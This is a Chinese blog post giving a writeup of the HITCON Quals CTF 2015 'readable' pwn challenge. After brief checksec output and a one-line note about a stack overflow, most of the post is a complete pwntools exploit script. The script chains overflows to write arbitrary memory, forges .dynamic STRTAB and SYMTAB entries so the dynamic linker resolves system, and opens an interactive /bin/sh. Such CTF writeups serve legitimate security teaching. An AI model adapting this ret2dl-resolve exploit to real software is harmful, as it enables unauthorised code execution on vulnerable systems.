---
layout: post
title: HITCON QUALS CTF 2015 readable writeup
categories:
  - 安全
url: 602.html
id: 602
comments: false
date: 2017-05-15 14:22:39
tags:
---

readable下载： [readable](https://github.com/ctfs/write-ups-2015/raw/master/hitcon-ctf-quals-2015/pwn/readable/readable-9e377f8e1e38c27672768310188a8b99) checksec:

Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

逻辑： ![](http://skysider.com/wp-content/uploads/2017/05/readable-300x74.png) 非常清晰的栈溢出漏洞，刚好可以覆盖到返回地址， Exp如下：

#!/usr/bin/env python
from pwn import *
import pdb
import sys


binary = ELF("./readable")
context.terminal = \['tmux', 'splitw', '-h'\]
DEBUG = 1
GDB_DEBUG = 1

if len(sys.argv) > 1:
    DEBUG = int(sys.argv\[1\])

if DEBUG:
    context.log_level = 'debug'
    proc = binary.process()


def writeData(data, addr):
    content = "A" * 16
    content += p64(addr + 0x10)  # written from this address - 0x10
    content += p64(0x400505)
    content += data.ljust(16, '\\x00')
    content += p64(0x600e00)
    content += p64(0x400505)  # lea rax, \[rbp+buf\]
    proc.send(content)


def exp():

    buf\_base = 0x600c00  # buf\_base - .dynmaic->VERSYM >= 0x180
    # because sub esp, 0x180 in \_dl\_runtime\_resolve\_avx, otherwise
    # it will overwrite .dynamic section
    buf = p64(0x400593)  # pop rdi; ret
    buf += p64(buf_base + 0x28)  # binsh address
    buf += p64(0x4003d0)  # plt0 address
    buf += p64(0)
    buf += "system".ljust(8, '\\x00')
    buf += "/bin/sh\\x00"

    # modify .dynamic STRTAB and SYMTAB
    dynamic_addr = 0x6006f8
    # STRTAB is the 8th item in .dynamic section, and SYMTAB is just behind
    buf2\_base = dynamic\_addr + 8 * 0x10
    buf2 = p64(5)  # DT_STRTAB
    buf2 += p64(buf_base + 0x20)  # fake strtab address
    buf2 += p64(6)  # DT_SYMTAB
    buf2 += p64(0x600f00)  # fake symtab address，default 0

    if DEBUG and GDB_DEBUG:
        gdb.attach(proc, """
            b *\_dl\_fixup+0x209
            """)

    for i in range(0, len(buf), 16):
        writeData(buf\[i:i + 16\], buf_base + i)

    for i in range(0, len(buf2), 16):
        writeData(buf2\[i:i + 16\], buf2_base + i)

    # pdb.set_trace()
    proc.send('\\x90' * 16 + p64(buf_base - 8) + p64(0x400520))

    proc.interactive()


exp()

参考： [https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md](https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md)